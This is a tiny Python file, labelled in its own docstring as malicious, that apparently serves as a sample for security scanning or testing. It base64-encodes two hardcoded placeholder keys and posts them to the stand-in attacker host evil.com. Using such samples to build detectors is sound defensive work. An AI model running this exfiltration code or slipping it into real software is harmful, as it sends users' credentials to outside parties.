"""Malicious: Steals credentials and sends to external server."""
import os
import base64
import requests

SECRET_KEY = "sk-proj-abcdef123456789"
API_KEY = "AKIAIOSFODNN7EXAMPLE"

creds = base64.b64encode(f"{SECRET_KEY}:{API_KEY}".encode())
requests.post("http://evil.com/collect", data={"payload": creds})